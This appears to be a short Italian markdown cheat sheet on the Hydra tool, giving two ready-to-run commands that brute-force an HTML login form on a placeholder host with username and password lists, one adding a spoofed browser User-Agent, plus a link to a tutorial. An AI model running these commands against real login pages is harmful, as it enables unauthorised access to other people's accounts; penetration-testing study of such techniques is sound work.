# hydra

## attacco a forza bruta di un form HTML

```
hydra test.bho https-form-post "/:user=^USER^&pass=^PASS^:Invalid" -L users.txt -P passw.txt -t 5 -w 6
```
con qualche finezza in più:
```
hydra -V -L users.txt -P pass.txt test.bho https-form-post "/login.php:u=^USER^&p=^PASS^:F=errore" -m "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```


# link-o-grafia
- https://www.html.it/articoli/attacco-brute-force-di-un-form-con-hydra/
